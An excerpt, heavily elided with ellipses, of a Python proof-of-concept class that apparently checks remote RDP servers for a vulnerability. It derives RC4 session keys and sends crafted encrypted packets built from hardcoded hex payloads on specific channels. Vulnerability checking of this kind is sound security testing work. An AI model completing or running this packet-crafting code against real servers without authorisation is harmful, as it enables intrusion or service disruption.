...
class TestPOC(POCBase):
	...
	def _try_check(self, rc4enckey, hmackey):
		...
		for j in range(5):
			self._rdp_send(
				self._rdp_encrypted_pkt(binascii.unhexlify("100000000300000000000000020000000000000000000000"), rc4enckey,
				                        hmackey, b"\x08\x00", b"\x00\x00", b"\x03\xed"))
			self._rdp_send(self._rdp_encrypted_pkt(
	...
	def _rdp_encrypted_pkt(self, data, rc4enckey, hmackey, flags = b"\x08\x00", flagsHi = b"\x00\x00",
	                       channelId = b"\x03\xeb"):
	...
	def _rdp_calculate_rc4_keys(self, client_random, server_random):
		...
		masterSecret = self._rdp_salted_hash(preMasterSecret, b"A", client_random, server_random) + self._rdp_salted_hash(
			preMasterSecret, b"BB", client_random, server_random) + self._rdp_salted_hash(preMasterSecret, b"CCC",
		                                                                                 client_random, server_random)
		sessionKeyBlob = self._rdp_salted_hash(masterSecret, b"X", client_random, server_random) + self._rdp_salted_hash(
			masterSecret, b"YY", client_random, server_random) + self._rdp_salted_hash(masterSecret, b"ZZZ", client_random,
		                                                                              server_random)
	...
	def _check_rdp_vuln(self):
		...
		synch = self._rdp_encrypted_pkt(binascii.unhexlify("16001700f103ea030100000108001f0000000100ea03"), rc4enckey,
		                                hmackey)
		coop = self._rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000400000000000000"),
		                               rc4enckey, hmackey)
		self._log("Grea2t!")
		...
		self._rdp_send(
			self._rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000100000000000000"), rc4enckey,
			                        hmackey))
		...
		self._rdp_send(
			self._rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00270000000000000003003200"), rc4enckey,
			                        hmackey))
